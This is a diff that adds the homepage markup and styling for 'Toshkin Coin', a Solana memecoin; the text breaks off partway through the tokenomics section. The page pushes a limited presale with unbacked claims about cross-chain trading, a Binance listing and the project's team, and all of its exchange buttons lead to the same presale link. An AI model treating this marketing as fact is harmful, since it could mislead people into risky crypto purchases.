+        .home-all-markets__image {
+            align-items: center;
+            background-color: var(--color-1);
+            border-radius: 40px;
+            display: flex;
+            justify-content: center;
+            overflow: hidden
+        }
+
+        .home-all-markets__image img {
+            width: 100%
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-all-markets__description {
+                font-size: 18px
+            }
+        }
+    </style>
+    <style>
+        .--theme_default {
+            --color-black: #000;
+            --color-white: #fff;
+            --color-main: #e8984b;
+            --color-1: #151515;
+            --color-2: #d21f3d;
+            --max-content: 1256px
+        }
+
+        .home-roadmap {
+            box-sizing: border-box;
+            margin: auto auto 96px;
+            max-width: 1256px;
+            padding: 0 16px;
+            width: 100%
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-roadmap {
+                margin-bottom: 56px
+            }
+        }
+
+        .home-roadmap__title {
+            display: flex;
+            justify-content: center
+        }
+
+        .home-roadmap__list {
+            -moz-column-gap: 80px;
+            column-gap: 80px;
+            display: grid;
+            grid-template-columns: calc(50% - 40px) calc(50% - 40px);
+            position: relative;
+            row-gap: 48px;
+            widows: 100%
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-roadmap__list {
+                display: flex;
+                flex-direction: column;
+                gap: 0
+            }
+        }
+
+        .home-roadmap__list:before {
+            background-color: var(--color-main);
+            bottom: 0;
+            content: "";
+            display: block;
+            height: 100%;
+            left: 50%;
+            position: absolute;
+            top: 0;
+            width: 1px
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-roadmap__list:before {
+                display: none;
+                left: 0
+            }
+        }
+
+        .home-roadmap__list-circle {
+            background-color: var(--color-black);
+            left: calc(50% - 8px);
+            position: absolute;
+            top: 0
+        }
+
+        .home-roadmap__stage {
+            background-color: var(--color-black);
+            border: 1px solid var(--color-main);
+            border-radius: 40px;
+            box-sizing: border-box;
+            padding: 48px 60px;
+            position: relative;
+            z-index: 1
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-roadmap__stage {
+                margin-bottom: 16px;
+                margin-left: 0 !important
+            }
+        }
+
+        .home-roadmap__stage-circle {
+            position: absolute;
+            top: 0;
+            z-index: 1
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-roadmap__stage-circle {
+                display: none !important
+            }
+        }
+
+        .home-roadmap__stage-circle_even {
+            left: -50px
+        }
+
+        @media only screen and (max-width:767px) {
+            .home-roadmap__stage-circle_even {
+                left: 0
+            }
+        }
+
+        .home-roadmap__stage-circle_odd {
+            right: -50px
+        }
+
+        @media only screen and (max-width:767px) {
+            .home-roadmap__stage-circle_odd {
+                left: 0;
+                right: unset
+            }
+        }
+
+        .home-roadmap__stage-item {
+            font-size: 18px;
+            position: relative
+        }
+
+        .home-roadmap__stage-item:before {
+            background-color: var(--color-2);
+            border-radius: 50%;
+            content: "";
+            height: 6px;
+            left: -20px;
+            position: absolute;
+            top: 9px;
+            width: 6px
+        }
+
+        .home-roadmap__stage-item svg {
+            margin-left: 20px
+        }
+
+        .home-roadmap__circle {
+            background-color: var(--color-black);
+            border: 1px solid var(--color-main);
+            border-radius: 50%;
+            display: block;
+            height: 16px;
+            width: 16px
+        }
+
+        .home-roadmap h4 {
+            color: var(--color-main);
+            font-size: 30px;
+            margin: 0 0 32px
+        }
+    </style>
+    <style>
+        .--theme_default {
+            --color-black: #000;
+            --color-white: #fff;
+            --color-main: #e8984b;
+            --color-1: #151515;
+            --color-2: #d21f3d;
+            --max-content: 1256px
+        }
+
+        .home-useful-links {
+            box-sizing: border-box;
+            margin: auto auto 96px;
+            max-width: 1256px;
+            padding: 0 16px;
+            width: 100%
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-useful-links {
+                margin-bottom: 56px
+            }
+        }
+
+        .home-useful-links__item {
+            background-color: var(--color-1);
+            border-radius: 40px;
+            cursor: pointer;
+            height: 350px;
+            margin-right: 20px;
+            overflow: hidden;
+            position: relative;
+            width: 396px
+        }
+
+        .home-useful-links__item img {
+            bottom: 0;
+            height: auto;
+            left: 0;
+            -o-object-fit: fill;
+            object-fit: fill;
+            position: absolute;
+            right: 0;
+            top: 0;
+            width: 100%
+        }
+
+        .home-useful-links__item-content {
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            justify-content: flex-end;
+            padding: 32px 20px;
+            position: relative;
+            transition: .2s;
+            width: 100%;
+            z-index: 1
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-useful-links__item-content {
+                background-color: rgba(0, 0, 0, .4)
+            }
+        }
+
+        .home-useful-links__item-link {
+            color: var(--color-main);
+            text-decoration: none
+        }
+
+        .home-useful-links__item-link:hover {
+            color: var(--color-2)
+        }
+
+        .home-useful-links__item-bottom {
+            height: 0;
+            transform: translateY(1000px);
+            transition: .4s ease-in-out
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-useful-links__item-bottom {
+                height: auto;
+                transform: translateY(0)
+            }
+        }
+
+        .home-useful-links__item h4 {
+            font-size: 20px;
+            text-transform: uppercase
+        }
+
+        .home-useful-links__item:hover .home-useful-links__item-bottom {
+            height: auto;
+            transform: translateY(0);
+            transition: 50ms ease-out
+        }
+
+        .home-useful-links__slider-bottom {
+            height: 16px;
+            margin-top: 60px;
+            width: 100%
+        }
+
+        .home-useful-links .flicking-pagination {
+            background-color: var(--color-main);
+            height: 1px;
+            width: 100% !important
+        }
+
+        .home-useful-links .flicking-pagination-slider {
+            align-items: center;
+            cursor: pointer;
+            display: flex;
+            height: 100%;
+            justify-content: flex-start;
+            transform: translate(0) !important;
+            width: 100%
+        }
+
+        .home-useful-links .flicking-pagination-bullet {
+            flex: 1;
+            height: 4px;
+            width: auto
+        }
+
+        .home-useful-links .flicking-pagination-bullet.flicking-pagination-bullet-active {
+            background-color: var(--color-main);
+            border-radius: 2px
+        }
+    </style>
+    <link rel="stylesheet" href="_MainSection.CdoEOEFa.css">
+    <link rel="stylesheet" href="_NftSection.C88SxIhJ.css">
+    <link rel="stylesheet" href="_ToshkinomicsSection.D8_ofeBl.css">
+    <link rel="stylesheet" href="_OurPartnersSection.DeDzdroq.css">
+    <link rel="stylesheet" href="_AllMarketsSection.gyQ4Jp7I.css">
+    <link rel="stylesheet" href="_RoadmapSection.D7ApIr43.css">
+    <link rel="stylesheet" href="_UsefulLinksSection.DsJPx5PC.css">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <link rel="icon" href="favicon.ico">
+    <link rel="apple-touch-icon" href="https://toshkin.com/apple-touch-icon.png">
+    <link rel="icon" href="favicon-32x32.png" sizes="32x32" type="image/png">
+    <link rel="icon" href="favicon-32x32.png" sizes="16x16" type="image/png">
+    <meta name="description" content="Toshkin Coin - Meme, NFT, Generative AI and Gaming">
+    <meta name="keywords" content="coins, buy, meme, toshkin, toshkin coin, NFT, gaming, AI, generative ai, ai">
+    <meta property="og:title" content="Toshkin Coin- Meme, NFT, AI and Gaming">
+    <meta property="og:url" content="https://toshkin.com/">
+    <meta property="og:description" content="Toshkin Coin - Meme, NFT, Generative AI and Gaming">
+    <meta property="og:image" content="https://www.toshkin.com/android-chrome-384x384.png">
+    <meta property="og:site_name" content="Toshkin Coin - Meme, NFT, Generative AI and Gaming">
+    <link rel="canonical" href="https://toshkin.com/">
+    <link rel="stylesheet" href="_AboutSection.BNneinfs.css">
+    <link rel="stylesheet" href="index.Dd6SdrtU.css">
+    <style>
+        .vue3-marquee {
+            display: flex !important;
+            position: relative
+        }
+
+        .vue3-marquee.horizontal {
+            overflow-x: hidden !important;
+            flex-direction: row !important;
+            width: 100%;
+            height: max-content
+        }
+
+        .vue3-marquee.vertical {
+            overflow-y: hidden !important;
+            flex-direction: column !important;
+            height: 100%;
+            width: max-content
+        }
+
+        .vue3-marquee:hover>.marquee {
+            animation-play-state: var(--pauseOnHover)
+        }
+
+        .vue3-marquee:active>.marquee {
+            animation-play-state: var(--pauseOnClick)
+        }
+
+        .vue3-marquee>.marquee {
+            flex: 0 0 auto;
+            min-width: var(--min-width);
+            min-height: var(--min-height);
+            z-index: 1;
+            animation: var(--orientation) var(--duration) linear var(--delay) var(--loops);
+            animation-play-state: var(--pauseAnimation);
+            animation-direction: var(--direction)
+        }
+
+        .vue3-marquee.horizontal>.marquee {
+            display: flex;
+            flex-direction: row;
+            align-items: center
+        }
+
+        .vue3-marquee.vertical>.marquee {
+            display: flex;
+            flex-direction: column;
+            align-items: center
+        }
+
+        @keyframes scrollX {
+            0% {
+                transform: translate(0)
+            }
+
+            to {
+                transform: translate(-100%)
+            }
+        }
+
+        @keyframes scrollY {
+            0% {
+                transform: translateY(0)
+            }
+
+            to {
+                transform: translateY(-100%)
+            }
+        }
+
+        .vue3-marquee>.overlay {
+            position: absolute;
+            width: 100%;
+            height: 100%
+        }
+
+        .vue3-marquee>.transparent-overlay {
+            position: absolute;
+            width: 100%;
+            height: 100%
+        }
+
+        .vue3-marquee>.overlay:before,
+        .vue3-marquee>.overlay:after {
+            content: "";
+            position: absolute;
+            z-index: 2
+        }
+
+        .vue3-marquee.horizontal>.overlay:before,
+        .vue3-marquee.horizontal>.overlay:after {
+            background: linear-gradient(to right, var(--gradient-color));
+            height: 100%;
+            width: var(--gradient-length)
+        }
+
+        .vue3-marquee.vertical>.overlay:before,
+        .vue3-marquee.vertical>.overlay:after {
+            background: linear-gradient(to bottom, var(--gradient-color));
+            height: var(--gradient-length);
+            width: 100%
+        }
+
+        .vue3-marquee.horizontal>.overlay:after {
+            transform: rotate(180deg)
+        }
+
+        .vue3-marquee.vertical>.overlay:after {
+            transform: rotate(-180deg)
+        }
+
+        .vue3-marquee>.overlay:before {
+            left: 0;
+            top: 0
+        }
+
+        .vue3-marquee.horizontal>.overlay:after {
+            right: 0;
+            top: 0
+        }
+
+        .vue3-marquee.vertical>.overlay:after {
+            left: 0;
+            bottom: 0
+        }
+    </style>
+    <link rel="stylesheet" href="default.DAwScbMP.css">
+</head>
+
+<body>
+    <div id="__nuxt"><!--[-->
+        <div class="nuxt-loading-indicator"
+            style="position: fixed; top: 0px; right: 0px; left: 0px; pointer-events: none; width: auto; height: 3px; opacity: 0; background: repeating-linear-gradient(to right, rgb(0, 220, 130) 0%, rgb(52, 205, 254) 50%, rgb(0, 71, 225) 100%); transform: scaleX(0); transform-origin: left center; transition: transform 0.1s ease 0s, height 0.4s ease 0s, opacity 0.4s ease 0s; z-index: 999999;">
+        </div>
+        <div class="--layout --theme_default">
+            <div class="-header">
+                <div class="-header__content">
+                    <div class="-header__logo"><svg xmlns="http://www.w3.org/2000/svg"
+                            xmlns:xlink="http://www.w3.org/1999/xlink" fill="none" viewBox="0 0 227 50" height="48px">
+                            <path fill="#fff"
+                                d="M202.242 38V12.44h5.796l10.188 15.768.072-.036V12.44h5.94V38h-5.976l-10.008-15.336h-.072V38zm-10.93 0V12.44h6.156V38zm-23.98 0V12.44h6.012v9.792h.072l7.416-9.792h7.596l-9.216 11.088L188.752 38h-7.38l-6.12-9.72-1.908 2.34V38zm-25.735 0V12.44h6.084v10.584h9V12.44h6.048V38h-6.048v-9.648h-9V38zm-12.755.324c-3.276 0-6.66-1.26-9.396-4.068l3.528-4.284c1.944 2.124 4.284 3.024 6.048 3.024 2.016 0 2.88-1.008 2.88-2.16 0-1.404-.9-2.016-3.78-2.988-3.888-1.332-7.776-3.168-7.776-8.208 0-4.248 3.636-7.452 8.388-7.524 3.348-.072 6.408 1.224 8.856 3.312l-3.384 4.392c-2.196-1.728-3.78-2.412-5.22-2.412-1.476 0-2.376.756-2.376 1.98-.036 1.224.9 1.872 3.672 2.952 4.5 1.728 7.956 2.88 7.956 7.812 0 6.012-5.148 8.172-9.396 8.172m-24.61 0c-7.776 0-13.176-5.4-13.176-13.104s5.4-13.14 13.176-13.14c7.632 0 13.14 5.292 13.14 13.14 0 7.812-5.508 13.104-13.14 13.104m0-5.58c3.96 0 6.84-3.276 6.84-7.524s-2.88-7.524-6.84-7.524c-4.032 0-6.876 3.348-6.876 7.524s2.844 7.524 6.876 7.524M77.488 38V17.804h-6.66V12.44h19.476v5.364h-6.696V38z">
+                            </path>
+                            <path fill="url(#a)" d="M0 0h50v50H0z"></path>
+                            <defs>
+                                <pattern id="a" width="1" height="1" patternContentUnits="objectBoundingBox">
+                                    <use xlink:href="#b" transform="scale(.00444)"></use>
+                                </pattern>
+                                <image xlink:href="f615dd994331eed0fa38c5947d32a80c1968527c.png" id="b" width="225"
+                                    height="225"></image>
+                            </defs>
+                        </svg></div>
+                    <nav>
+                        <ul class="-header__menu"><!--[-->
+                            <li class="-header__menu-item"><button
+                                    class="-header__button  -header__button_active">Home</button></li>
+                            <li class="-header__menu-item"><button class="-header__button">About</button></li>
+                            <li class="-header__menu-item"><button class="-header__button">NFT</button></li>
+                            <li class="-header__menu-item"><button class="-header__button">Toshkinomics</button></li>
+                            <li class="-header__menu-item"><button class="-header__button">Roadmap</button></li>
+                            <li class="-header__menu-item"><a href="https://toshkin.gitbook.io/whitepaper"
+                                    class="-header__button" target="_blank" rel="nofollow">Whitepage</a></li><!--]-->
+                        </ul>
+                    </nav>
+                    <div class="-header__mobile-left"><!---->
+                        <div class="header-mobile-menu" data-v-7189b683="">
+                            <div class="menu-icon" data-v-7189b683="" data-v-68d35315=""><input
+                                    class="menu-icon__cheeckbox" type="checkbox" data-v-68d35315="">
+                                <div data-v-68d35315=""><span data-v-68d35315=""></span><span data-v-68d35315=""></span>
+                                </div>
+                            </div>
+                            <nav class="header-mobile-menu__navigation header-mobile-menu__navigation"
+                                data-v-7189b683="">
+                                <ul data-v-7189b683=""><!--[-->
+                                    <li data-v-7189b683=""><button class="-header__button"
+                                            data-v-7189b683="">Home</button></li>
+                                    <li data-v-7189b683=""><button class="-header__button"
+                                            data-v-7189b683="">About</button></li>
+                                    <li data-v-7189b683=""><button class="-header__button"
+                                            data-v-7189b683="">NFT</button></li>
+                                    <li data-v-7189b683=""><button class="-header__button"
+                                            data-v-7189b683="">Toshkinomics</button></li>
+                                    <li data-v-7189b683=""><button class="-header__button"
+                                            data-v-7189b683="">Roadmap</button></li>
+                                    <li data-v-7189b683=""><a href="https://toshkin.gitbook.io/whitepaper"
+                                            class="-header__button" target="_blank" data-v-7189b683="">Whitepage</a>
+                                    </li><!--]-->
+                                </ul>
+                                <div class="-socials" data-v-7189b683=""><!--[--><a href="https://x.com/toshkincoin"
+                                        title="X" class="-socials__icons -socials__x" target="_blank"
+                                        rel="nofollow"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 76 56">
+                                            <path
+                                                d="m15.32 6.907 17.599 23.268-17.711 18.918h3.986L34.7 32.53l12.527 16.563h13.565l-18.59-24.577 16.485-17.61h-3.986l-14.28 15.255L28.883 6.907zm5.86 2.903h6.232L54.93 46.19h-6.231z">
+                                            </path>
+                                        </svg></a><a href="https://t.me/toshkincoin" title="Telegram"
+                                        class="-socials__icons -socials__telegram" target="_blank" rel="nofollow"><svg
+                                            xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 60">
+                                            <path
+                                                d="m24.45 46.625.7-10.575 19.2-17.3c.85-.775-.175-1.15-1.3-.475L19.35 33.25 9.1 30c-2.2-.625-2.225-2.15.5-3.25l39.925-15.4c1.825-.825 3.575.45 2.875 3.25l-6.8 32.025c-.475 2.275-1.85 2.825-3.75 1.775L31.5 40.75l-4.975 4.825c-.575.575-1.05 1.05-2.075 1.05">
+                                            </path>
+                                        </svg></a><a href="https://x.com/toshkincoin" title="Tiktok"
+                                        class="-socials__icons -socials__tiktok" target="_blank" rel="nofollow"><svg
+                                            xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                                            <path
+                                                d="M18.393 48.05c-4.189-.756-8.15-3.667-9.91-7.281-1.221-2.51-1.69-5.163-1.389-7.851.56-4.982 3.138-9.061 7.147-11.306 2.113-1.183 5.14-1.771 7.395-1.436l1.303.193v7.967l-1.232-.052c-2.972-.123-5.185 1.15-6.329 3.634-.547 1.188-.685 3.3-.3 4.587.474 1.588 1.877 3.02 3.57 3.65.578.215 1.202.297 2.272.293 1.332-.001 1.576-.048 2.513-.491 1.356-.641 2.345-1.572 2.927-2.753.377-.765.498-1.274.616-2.582.08-.896.149-8.216.152-16.268l.003-14.64h2.54c1.397 0 3.074.044 3.728.1l1.188.1v.589c0 1.416.829 4.133 1.677 5.501.213.342.953 1.18 1.647 1.864 1.34 1.32 2.47 1.988 4.21 2.486.512.148 1.053.33 1.201.405.149.074.428.14.622.14.193.002.509.045.701.097l.35.093v7.39l-.66-.07c-3.57-.386-6.424-1.338-8.7-2.905-1.132-.779-1.23-.825-1.123-.528.039.108.011 4.178-.061 9.048-.125 8.442-.147 8.911-.475 10.093-1.259 4.54-4.085 7.91-7.806 9.31-2.276.857-5.187 1.092-7.777.624">
+                                            </path>
+                                        </svg></a><!--]--></div>
+                            </nav>
+                        </div>
+                    </div>
+                </div>
+                <div class="-attention -header__attention">
+                    <div class="vue3-marquee horizontal -attention__wrapper"
+                        style="--duration: 20s; --delay: 0s; --direction: normal; --pauseOnHover: running; --pauseOnClick: running; --pauseAnimation: running; --loops: infinite; --gradient-color: rgba(255, 255, 255, 1), rgba(255, 255, 255, 0); --gradient-length: 200px; --min-width: 100%; --min-height: auto; --orientation: scrollX;">
+                        <div class="transparent-overlay" aria-hidden="true"></div><!---->
+                        <div class="marquee"><a
+                                href="https://www.pinksale.finance/solana/launchpad/2Lwyqnu6QiFshC79WdQJc4R7CK3AtVMfHPZCgP4oSH6x"
+                                target="_blank" rel="nofollow">SOLANA limited presale NOW 21-27 July 2024 don’t miss
+                                out, CLICK HERE</a><a
+                                href="https://www.pinksale.finance/solana/launchpad/2Lwyqnu6QiFshC79WdQJc4R7CK3AtVMfHPZCgP4oSH6x"
+                                target="_blank" rel="nofollow">CLICK HERE for limited presale NOW on PINKSALE - only
+                                21-27 July 2024 don’t miss out, CLICK HERE</a></div>
+                        <div aria-hidden="true" class="marquee"><a
+                                href="https://www.pinksale.finance/solana/launchpad/2Lwyqnu6QiFshC79WdQJc4R7CK3AtVMfHPZCgP4oSH6x"
+                                target="_blank" rel="nofollow">SOLANA limited presale NOW 21-27 July 2024 don’t miss
+                                out, CLICK HERE</a><a
+                                href="https://www.pinksale.finance/solana/launchpad/2Lwyqnu6QiFshC79WdQJc4R7CK3AtVMfHPZCgP4oSH6x"
+                                target="_blank" rel="nofollow">CLICK HERE for limited presale NOW on PINKSALE - only
+                                21-27 July 2024 don’t miss out, CLICK HERE</a></div>
+                    </div>
+                </div>
+            </div>
+            <div class="--content"><!--[-->
+                <div class="home" id="homePage">
+                    <section class="home-main" id="home" data-section="home">
+                        <h1>Toshkin <span>Coin</span></h1>
+                        <div class="home-main__left">
+                            <div class="home-main__description">
+                                <p></p>
+                                <p>The power Meme with an attitude on the Solana network, building cross-bridges to ETH,
+                                    BASE, and Binance chains!</p>
+                                <p>Dipping its whiskers into the vast possibilities of Web3.</p>
+                                <p>TOSHKIN is an Social AI evolution in the world of viral cultural memecoins, with a
+                                    rapidly growing fanbase.</p>
+                                <p></p>
+                                <p>TOSHKIN is a unique update to the viral cultural memecoins.</p>
+                            </div>
+                            <div class="home-main__list"><!--[--><a
+                                    href="https://www.pinksale.finance/solana/launchpad/2Lwyqnu6QiFshC79WdQJc4R7CK3AtVMfHPZCgP4oSH6x"
+                                    target="_blank" class="home-main__button" rel="nofollow">Buy on PreSale SOL</a><a
+                                    href="https://www.pinksale.finance/solana/launchpad/2Lwyqnu6QiFshC79WdQJc4R7CK3AtVMfHPZCgP4oSH6x"
+                                    target="_blank" class="home-main__button" rel="nofollow">Buy on Dextools
+                                    (soon)</a><a
+                                    href="https://www.pinksale.finance/solana/launchpad/2Lwyqnu6QiFshC79WdQJc4R7CK3AtVMfHPZCgP4oSH6x"
+                                    target="_blank" class="home-main__button" rel="nofollow">Pancake Swap (soon)</a><a
+                                    href="https://www.pinksale.finance/solana/launchpad/2Lwyqnu6QiFshC79WdQJc4R7CK3AtVMfHPZCgP4oSH6x"
+                                    target="_blank" class="home-main__button" rel="nofollow">Buy on Raydium (soon)</a><a
+                                    href="https://www.pinksale.finance/solana/launchpad/2Lwyqnu6QiFshC79WdQJc4R7CK3AtVMfHPZCgP4oSH6x"
+                                    target="_blank" class="home-main__button" rel="nofollow">Buy on UniSwap (soon)</a><a
+                                    href="https://www.pinksale.finance/solana/launchpad/2Lwyqnu6QiFshC79WdQJc4R7CK3AtVMfHPZCgP4oSH6x"
+                                    target="_blank" class="home-main__button" rel="nofollow">Buy on Jupiter (soon)</a><a
+                                    href="https://www.pinksale.finance/solana/launchpad/2Lwyqnu6QiFshC79WdQJc4R7CK3AtVMfHPZCgP4oSH6x"
+                                    target="_blank" class="home-main__button" rel="nofollow">Buy on BitMart (soon)</a><a
+                                    href="https://www.pinksale.finance/solana/launchpad/2Lwyqnu6QiFshC79WdQJc4R7CK3AtVMfHPZCgP4oSH6x"
+                                    target="_blank" class="home-main__button" rel="nofollow">Buy on Binance
+                                    (soon)</a><!--]--></div>
+                        </div>
+                        <div class="home-main__right">
+                            <div class="home-main__image --image"><img src="main.gif" alt="description iamge"><a
+                                    href="https://www.pinksale.finance/solana/launchpad/2Lwyqnu6QiFshC79WdQJc4R7CK3AtVMfHPZCgP4oSH6x"
+                                    target="_blank" class="--image__url"></a></div>
+                            <div class="home-main__description">
+                                <p>Bringing pop culture, Generative AI, and NFTs together.</p>
+                                <p> Gaming Seasons, Rare Art releases, Staking, Gen AI!</p>
+                                <p></p>TOSHKIN Coin shines on the market to become the biggest cross-blockchain memecoin
+                                phenomenon.<p></p>
+                            </div>
+                        </div>
+                        <div class="home-main__banner --image"><img src="main-banner-new.gif" alt=""><a
+                                href="https://www.pinksale.finance/solana/launchpad/2Lwyqnu6QiFshC79WdQJc4R7CK3AtVMfHPZCgP4oSH6x"
+                                target="_blank" class="--image__url"></a></div>
+                    </section>
+                    <section class="home-about" id="about" data-section="about" data-v-5bfafd3a="">
+                        <div class="home-about__about" data-v-5bfafd3a="">
+                            <h2 class="home-about__title" data-v-5bfafd3a=""><span>About</span> Toshkin</h2>
+                            <div class="home-about__right" data-v-5bfafd3a="">
+                                <div class="home-about__description" data-v-5bfafd3a="">
+                                    <p>With explosive marketing and reaching places that no other memecoin has reached,
+                                        we are soon to lunch cross-bridges to the Ethereum network, bringing a new
+                                        typeand deep liquidity of audience to the most fun memecoin today.</p>
+                                    <p>TOSHKIN is the meme coin with an attitude set to be the next hype on the SOLANA
+                                        network. It's also natively trades on ETH, BASE, and BSC. Its fun, popular, and
+                                        beloved token similar to today's hypes such as Dogecoin, WIF, Floki, Bonk, and
+                                        PEPE, with an attitude twist and sea of new features. </p>
+                                    <p></p>
+                                    <p> The TOSHKIN Project has excited and motivated a team of 26 highly capable
+                                        individuals, pushing through the Metaverse.</p>
+                                    <p></p>
+                                </div>
+                            </div>
+                            <div class="home-about__left" data-v-5bfafd3a=""><!--[-->
+                                <div class="home-about__image --image" data-v-5bfafd3a=""><img src="left-one.png"
+                                        alt="one" data-v-5bfafd3a=""><!----></div>
+                                <div class="home-about__image --image" data-v-5bfafd3a=""><img src="left-two.png"
+                                        alt="two" data-v-5bfafd3a=""><!----></div><!--]-->
+                            </div>
+                        </div>
+                        <div class="home-about__team" id="team" data-section="team" data-v-5bfafd3a="">
+                            <div class="home-about__left" data-v-5bfafd3a=""><!--[-->
+                                <div class="home-about__image --image" data-v-5bfafd3a=""><img src="left-three.png"
+                                        alt="three" data-v-5bfafd3a=""><!----></div>
+                                <div class="home-about__image --image" data-v-5bfafd3a=""><img src="left-four.png"
+                                        alt="four" data-v-5bfafd3a=""><!----></div><!--]-->
+                            </div>
+                            <h2 class="home-about__title" data-v-5bfafd3a="">Team</h2>
+                            <div class="home-about__right" data-v-5bfafd3a="">
+                                <div class="home-about__list" data-v-5bfafd3a=""><!--[-->
+                                    <div class="home-about__item" data-v-5bfafd3a="">
+                                        <div class="home-about__item-img" data-v-5bfafd3a=""><img src="team-1.png"
+                                                data-v-5bfafd3a="">
+                                            <p class="home-about__item-title" data-v-5bfafd3a="">Dan</p>
+                                            <p class="home-about__item-title" data-v-5bfafd3a="">Project Lead</p>
+                                        </div>
+                                    </div>
+                                    <div class="home-about__item" data-v-5bfafd3a="">
+                                        <div class="home-about__item-img" data-v-5bfafd3a=""><img src="team-2.png"
+                                                data-v-5bfafd3a="">
+                                            <p class="home-about__item-title" data-v-5bfafd3a="">Serge</p>
+                                            <p class="home-about__item-title" data-v-5bfafd3a="">WEB3 Integration</p>
+                                        </div>
+                                    </div>
+                                    <div class="home-about__item" data-v-5bfafd3a="">
+                                        <div class="home-about__item-img" data-v-5bfafd3a=""><img src="team-3.png"
+                                                data-v-5bfafd3a="">
+                                            <p class="home-about__item-title" data-v-5bfafd3a="">OG</p>
+                                            <p class="home-about__item-title" data-v-5bfafd3a="">Web Design</p>
+                                        </div>
+                                    </div>
+                                    <div class="home-about__item" data-v-5bfafd3a="">
+                                        <div class="home-about__item-img" data-v-5bfafd3a=""><img src="team-4.png"
+                                                data-v-5bfafd3a="">
+                                            <p class="home-about__item-title" data-v-5bfafd3a="">Nadin</p>
+                                            <p class="home-about__item-title" data-v-5bfafd3a="">CRM and SEO</p>
+                                        </div>
+                                    </div>
+                                    <div class="home-about__item" data-v-5bfafd3a="">
+                                        <div class="home-about__item-img" data-v-5bfafd3a=""><img src="team-5.png"
+                                                data-v-5bfafd3a="">
+                                            <p class="home-about__item-title" data-v-5bfafd3a="">Ariana</p>
+                                            <p class="home-about__item-title" data-v-5bfafd3a="">Art Design</p>
+                                        </div>
+                                    </div>
+                                    <div class="home-about__item" data-v-5bfafd3a="">
+                                        <div class="home-about__item-img" data-v-5bfafd3a=""><img src="team-6.png"
+                                                data-v-5bfafd3a="">
+                                            <p class="home-about__item-title" data-v-5bfafd3a="">MK</p>
+                                            <p class="home-about__item-title" data-v-5bfafd3a="">Digital Marketing</p>
+                                        </div>
+                                    </div>
+                                    <div class="home-about__item" data-v-5bfafd3a="">
+                                        <div class="home-about__item-img" data-v-5bfafd3a=""><img src="team-7.png"
+                                                data-v-5bfafd3a="">
+                                            <p class="home-about__item-title" data-v-5bfafd3a="">Rus</p>
+                                            <p class="home-about__item-title" data-v-5bfafd3a="">DEX/CEX listings</p>
+                                        </div>
+                                    </div>
+                                    <div class="home-about__item" data-v-5bfafd3a="">
+                                        <div class="home-about__item-img" data-v-5bfafd3a=""><img src="team-8.png"
+                                                data-v-5bfafd3a="">
+                                            <p class="home-about__item-title" data-v-5bfafd3a="">Appa</p>
+                                            <p class="home-about__item-title" data-v-5bfafd3a="">Video Content</p>
+                                        </div>
+                                    </div><!--]-->
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+                    <section class="home-nft" id="nft" data-section="nft">
+                        <h2 class="home-nft__title"><span>NFT</span> and Binance</h2>
+                        <div class="home-nft__left">
+                            <div class="home-about__description">
+                                <p>TOSHKIN has unique characteristics that make it shine among other current coins.</p>
+                                <p>We are introducing AI integration and a rare, unique NFT collection featuring the
+                                    cutest designs.</p>
+                                <p>By purchasing any of our rare and valuable NFTs, you're directly contributing to our
+                                    goal of being listed on the world's largest exchange -Binance.</p>
+                                <p>Be a part of this exciting journey and help us soar to new heights in the
+                                    cryptocurrency market! 100% of NFT purchases and USDT fees from this wallet will be
+                                    allocated towards listing on Binance. Additionally, 10% of the project's marketing
+                                    wallet, which is replenished daily, will be transferred to the NFT wallet, further
+                                    bolstering our listing efforts.</p>
+                                <p>TOSHKIN's unique NFTs offer additional whitelist airdrops, special NFT releases, and
+                                    exclusive presale opportunities!</p>
+                                <p>OpenSea NFT Trading is coming.</p>
+                            </div><img src="banner.gif" alt="banner" class="home-nft__banner">
+                        </div>
+                        <div class="home-nft__right">
+                            <div class="home-nft__wallet">
+                                <div class="home-nft__wallet-top">
+                                    <div class="home-nft__wallet-top-image"><img src="NFT_Dynamic.gif" alt="coin">
+                                        <p class="home-nft__wallet-info"><span>147</span> / 1001 minted</p>
+                                    </div><a href="https://opensea.io/collection/originals-25" class="button_white"
+                                        target="_blank" rel="nofollow">NFT Collections</a>
+                                </div>
+                                <h4 class="home-nft__wallet-title">TOSHKIN - ORIGINALS</h4>
+                                <div class="home-nft__wallet-buttons">
+                                    <div class="home-nft__wallet-counter"><button
+                                            disabled="">-</button><span>0</span><button>+</button></div><a
+                                        href="https://opensea.io/collection/originals-25" target="_blank"
+                                        class="button_yellow" rel="nofollow">NFT Collections</a>
+                                </div>
+                                <h4 class="home-nft__wallet-title home-nft__wallet-title-last">TOTAL FILLED:
+                                    <span>$8,114.16</span> USDT</h4>
+                                <p class="home-nft__wallet-text">NFT that will bring TOSHKIN to Binance.</p>
+                            </div>
+                        </div><!---->
+                    </section>
+                    <section class="home-toshkinomics" id="toshkinomics" data-section="toshkinomics">
+                        <h2 class="home-toshkinomics__title"><span>Toshkin</span>OMICS</h2>
+                        <div class="home-toshkinomics__wrapper">
+                            <div class="home-toshkinomics__block home-toshkinomics__about">
+                                <h4>About Token</h4>
+                                <ul class="home-toshkinomics__list"><!--[-->
+                                    <li class="home-toshkinomics__item">
+                                        <p class="home-toshkinomics__item-title">Token Name:</p>
+                                        <p class="home-toshkinomics__item-value">TOSHKIN COIN</p>
+                                    </li>
+                                    <li class="home-toshkinomics__item">
+                                        <p class="home-toshkinomics__item-title">Token Symbol:</p>
+                                        <p class="home-toshkinomics__item-value">TOSHKIN</p>
+                                    </li>
+                                    <li class="home-toshkinomics__item">
+                                        <p class="home-toshkinomics__item-title">Total Supply:</p>
+                                        <p class="home-toshkinomics__item-value">9,900,000,000</p>
+                                    </li>
+                                    <li class="home-toshkinomics__item">
+                                        <p class="home-toshkinomics__item-title">Presale + Liquidity:</p>
